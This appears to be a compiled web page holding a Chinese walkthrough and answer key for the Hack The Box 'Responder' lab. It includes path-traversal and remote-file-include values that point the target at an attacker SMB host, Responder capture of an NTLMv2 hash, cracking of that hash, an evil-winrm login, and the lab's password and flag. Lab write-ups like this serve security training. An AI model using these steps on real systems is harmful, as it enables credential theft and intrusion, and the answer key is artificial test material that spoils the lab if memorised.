import{_ as n,W as a,X as l,Y as e,Z as s,a0 as t,a1 as o,C as r}from"./framework-b6a07282.js";const d="/assets/1-9ffeb62d.png",c="/assets/2-5cf57495.png",m="/assets/3-59ce2a4b.png",h="/assets/4-c82120f0.png",u="/assets/5-f9cf5334.png",p="/assets/6-98966d99.png",v="/assets/7-f994c23d.png",g="/assets/8-b9339604.png",_="/assets/9-0c942ddf.png",f="/assets/10-375d5eb3.png",b="/assets/11-cc4d5eae.png",E="/assets/12-51366312.png",x="/assets/13-f080174d.png",C="/assets/14-51353c9a.png",A={},B=o('<h2 id="responder攻略" tabindex="-1"><a class="header-anchor" href="#responder攻略" aria-hidden="true">#</a> Responder攻略</h2><h3 id="渗透过程" tabindex="-1"><a class="header-anchor" href="#渗透过程" aria-hidden="true">#</a> 渗透过程</h3><ol><li>使用nmap（-sC用默认脚本、-sV扫描该服务器所运行服务的版本）扫描靶机。发现开放了80端口和5985端口。</li></ol><img src="'+d+'"><ol start="2"><li>访问web。发现跳转至unika.htb</li></ol><img src="'+c+`"><ol start="3"><li>尝试修改hosts文件，再进行访问。</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vim /etc/hosts
10.129.126.15   unika.htb
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+m+'"><ol start="4"><li>查看网页源代码，发现有page?=*.html，疑似存在文件包含。</li></ol><img src="'+h+'"><img src="'+u+'"><ol start="5"><li>进行测试，发现报错出了当前目录，并确定确实存在本地文件包含。</li></ol><img src="'+p+'"><img src="'+v+`"><ol start="6"><li>使用Responder来伪造smb服务来获取目标靶机的ntlm hash。</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Responder.conf中设置SMB=On
./Responder.py -I tun0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+g+'"><ol start="7"><li>测试是否存在远程文件包含，并让靶机访问smb服务。</li></ol><img src="'+_+'"><img src="'+f+'"><img src="'+b+`"><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[SMB] NTLMv2-SSP Client   : 10.129.126.15
[SMB] NTLMv2-SSP Username : RESPONDER\\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:67d44d09648dcd4f:379E99B2C0356604331185244D8B093C:010100000000000080E425CB9070D9019EABF6200AE7B91C0000000002000800530054005200500001001E00570049004E002D0051004D004B00360033004A004100330052004900340004003400570049004E002D0051004D004B00360033004A00410033005200490034002E0053005400520050002E004C004F00430041004C000300140053005400520050002E004C004F00430041004C000500140053005400520050002E004C004F00430041004C000700080080E425CB9070D90106000400020000000800300030000000000000000100000000200000D301263330A2DE8862DD5DFAC13056BA563905F4A9FAC1619BCA49B01980EAE90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="8"><li>使用join进行hash破解</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>┌──(root㉿kali)-[~]
└─# vim hash.txt

┌──(root㉿kali)-[~]
└─# cat hash.txt
Administrator::RESPONDER:67d44d09648dcd4f:379E99B2C0356604331185244D8B093C:010100000000000080E425CB9070D9019EABF6200AE7B91C0000000002000800530054005200500001001E00570049004E002D0051004D004B00360033004A004100330052004900340004003400570049004E002D0051004D004B00360033004A00410033005200490034002E0053005400520050002E004C004F00430041004C000300140053005400520050002E004C004F00430041004C000500140053005400520050002E004C004F00430041004C000700080080E425CB9070D90106000400020000000800300030000000000000000100000000200000D301263330A2DE8862DD5DFAC13056BA563905F4A9FAC1619BCA49B01980EAE90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000

解出来是：badminton        (Administrator)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+E+`"><ol start="9"><li>使用evil-winrm连接WinRM（5985端口）</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>evil-winrm -i 10.129.126.15 -u Administrator -p badminton

*Evil-WinRM* PS C:\\Users\\mike\\Desktop&gt; type flag.txt
ea81b7afddd03efaa0945333ed147fac
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+x+'"><img src="'+C+'"><h3 id="问题" tabindex="-1"><a class="header-anchor" href="#问题" aria-hidden="true">#</a> 问题</h3>',31),w=e("li",null,"When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb",-1),D=e("li",null,"Which scripting language is being used on the server to generate webpages? php",-1),F=e("li",null,"What is the name of the URL parameter which is used to load different language versions of the webpage? page",-1),R=e("code",null,"page",-1),k={href:"//10.10.14.6/somefile",target:"_blank",rel:"noopener noreferrer"},S=e("code",null,"page",-1),N={href:"//10.10.14.6/somefile",target:"_blank",rel:"noopener noreferrer"},W={href:"//10.10.14.6/somefile",target:"_blank",rel:"noopener noreferrer"},y=e("li",null,"What does NTLM stand for? New Technology Lan Manager",-1),M=e("li",null,"Which flag do we use in the Responder utility to specify the network interface? -I",-1),L=e("li",null,[s("There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as "),e("code",null,"john"),s(", but the full name is what?. John the Ripper")],-1),I=e("li",null,"What is the password for the administrator user? badminton",-1),P=e("li",null,"We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 5985",-1),T=e("li",null,"Submit root flag ea81b7afddd03efaa0945333ed147fac",-1);function O(V,U){const i=r("ExternalLinkIcon");return a(),l("div",null,[B,e("ol",null,[w,D,F,e("li",null,[s("Which of the following values for the "),R,s(' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "'),e("a",k,[s("//10.10.14.6/somefile"),t(i)]),s('", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" ../../../../../../../../windows/system32/drivers/etc/hosts')]),e("li",null,[s("Which of the following values for the "),S,s(' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "'),e("a",N,[s("//10.10.14.6/somefile"),t(i)]),s('", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" '),e("a",W,[s("//10.10.14.6/somefile"),t(i)])]),y,M,L,I,P,T])])}const z=n(A,[["render",O],["__file","08Responder.html.vue"]]);export{z as default};
